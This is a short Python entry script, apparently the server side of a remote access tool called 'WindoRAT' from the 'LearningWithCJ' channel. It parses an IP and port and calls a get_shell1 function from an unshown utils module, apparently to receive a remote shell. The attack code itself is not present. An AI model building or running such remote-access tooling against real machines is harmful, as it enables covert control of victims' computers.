#
#  _                                _                __          __ _  _    _        _____      _ 
# | |                              (_)               \ \        / /(_)| |  | |      / ____|    | |
# | |      ___   __ _  _ __  _ __   _  _ __    __ _   \ \  /\  / /  _ | |_ | |__   | |         | |
# | |     / _ \ / _` || '__|| '_ \ | || '_ \  / _` |   \ \/  \/ /  | || __|| '_ \  | |     _   | |
# | |____|  __/| (_| || |   | | | || || | | || (_| |    \  /\  /   | || |_ | | | | | |____| |__| |
# |______|\___| \__,_||_|   |_| |_||_||_| |_| \__, |     \/  \/    |_| \__||_| |_|  \_____|\____/ 
#                                              __/ |                                              
#                                             |___/                         -  By CJ
#
# YouTube : www.youtube.com/@LearningWithCJ
# GitHub  : www.github.com/LearningWithCJ
# Telegram: t.me/LearningWithCJ
#

from utils import *
import argparse



# __                __              _       _____         _______
# \ \      __      / /_            | |     |  __ \     /\|__   __|
#  \ \    /  \    / /(_)  _ __   __| | ___ | |__) |   /  \  | |
#   \ \  / /\ \  / / | | | '_ \ / _  |/ _ \|  _  /   / /\ \ | |
#    \ \/ /  \ \/ /  | | | | | | (_| | (_) | | \ \  / ____ \| |
#     \__/    \__/   |_| |_| |_|\__,_|\___/|_|  \_\/_/    \_\_|
#    
#                                           -  By CJ



parser = argparse.ArgumentParser(usage="%(prog)s [--server] [-i <IP> -p <PORT>]")
parser.add_argument('--server', help='Create Server', action='store_true')
parser.add_argument('-i', '--ip', metavar='<IP>', type=str, help='Enter the IP')
parser.add_argument('-p', '--port', metavar='<PORT>', type=str, help='Enter the Port')
args = parser.parse_args()

if args.server:
    if args.ip and args.port:
        get_shell1(args.ip, args.port)
